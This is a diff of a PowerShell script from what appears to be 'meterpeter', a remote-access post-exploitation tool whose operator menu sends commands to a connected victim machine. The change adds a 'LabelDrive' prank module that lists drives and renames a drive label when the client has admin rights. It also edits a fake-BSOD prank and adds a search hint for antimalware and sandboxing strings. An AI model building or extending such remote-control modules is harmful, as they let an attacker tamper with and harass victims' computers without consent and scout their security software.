@@ -855,9 +855,44 @@ While($Client.Connected)
       write-host "   GoogleX        Browser google easter eggs manager";
       write-host "   CriticalError  Prank that fakes a critical system error";
       write-host "   Nodrives       Hide All Drives (C:D:E:F:G) From Explorer";
+      write-host "   LabelDrive     Rename drive letter (C:) label From Explorer";
       write-host "   Return         Return to Server Main Menu" -ForeGroundColor yellow
       write-host "`n`n :meterpeter:Pranks> " -NoNewline -ForeGroundColor Green;
       $choise = Read-Host;
+      If($choise -ieq "LabelDrive" -or $choise -ieq "Label")
+      {
+        write-host "`n`n   Description:" -ForegroundColor Yellow;
+        write-host "   Module to rename drive label";
+        write-host "`n`n   Modules   Description                     Privileges Required" -ForegroundColor green;
+        write-host "   -------   -----------                     -------------------";
+        write-host "   List      ALL drives available            UserLand" 
+        write-host "   Rename    Rename drive letter label       " -NoNewline;
+        write-host "Administrator" -ForegroundColor Red;
+        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
+        write-host "`n`n :meterpeter:Pranks:Label> " -NoNewline -ForeGroundColor Green;
+        $choise_two = Read-Host;
+        If($choise_two -ieq "List")
+        {
+           write-host " * Listing all drives available .." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n";
+           $Command = "`$PSVERSION = (`$Host).version.Major;If(`$PSVERSION -gt 5){Get-PSDrive -PSProvider 'FileSystem'|Select-Object Root,CurrentLocation,Used,Free|ft|Out-File dellog.txt}Else{Get-Volume|Select-Object DriveLetter,FileSystemLabel,FileSystemType,HealthStatus,SizeRemaining,Size|FT|Out-File dellog.txt};Get-Content dellog.txt;Remove-Item dellog.txt -Force";
+        }
+        If($choise_two -ieq "Rename")
+        {
+          $MyDrive = Read-Host " - DriveLetter to change the label (C): "
+          $MyDName = Read-Host " - Drive new Friendly Name (Armagedon): "
+          write-host " * Rename Drive ${MyDrive}: label to [" -ForegroundColor Green -NoNewline
+          write-host "$MyDName" -ForegroundColor Red -NoNewline;
+          write-host "]" -ForegroundColor Green;
+          
+          Start-Sleep -Seconds 1;write-host "`n";
+          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Set-Volume -DriveLetter $MyDrive -NewFileSystemLabel `"$MyDName`";Start-Sleep -Seconds 1;Get-Volume -DriveLetter $MyDrive|Select-Object DriveLetter,FileSystemLabel,FileSystemType,HealthStatus,SizeRemaining,Size|FT}Else{echo `"   [i] Client Admin Privileges Required (run as administrator)``n`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
+        }
+        If($choise_two -ieq "Return" -or $choise_two -ieq "cls" -or $choise_two -ieq "Modules" -or $choise_two -ieq "clear")
+        {
+           $Command = $Null;
+           $choise_two = $Null;
+        }
+      }
       If($choise -ieq "Nodrives")
       {
         write-host "`n`n   Description:" -ForegroundColor Yellow;
@@ -908,7 +943,7 @@ While($Client.Connected)
          Write-Host "   => takes aprox 30 seconds to run`n`n" -ForegroundColor DarkYellow
 
          write-host "   Executing BSOD prank in background." -ForegroundColor Green
-         write-host "   MaxInteractions:$MaxInteractions DelayTime:$DelayTime(sec)" -ForegroundColor DarkGray;
+         write-host "   MaxInteractions:$MaxInteractions DelayTime:$DelayTime(sec)`n" -ForegroundColor DarkGray;
          If($bsodwallpaper -ieq "true")
          {
             write-host "   Wallpaper Path : `$Env:TMP\bsod.png" -ForegroundColor DarkGray;
@@ -1794,7 +1829,7 @@ While($Client.Connected)
             write-host "   => Slipt diferent strings to search with PIPE (|) command." -ForegroundColor DarkYellow;
             Start-Sleep -Seconds 1
             
-            Write-Host " - Search for string(s): " -NoNewline;
+            Write-Host " - Search for string (antimalware|sandboxing): " -NoNewline;
             $StringToSearch = Read-Host;
             If(-not($StringToSearch) -or $StringToSearch -eq $null)
             {
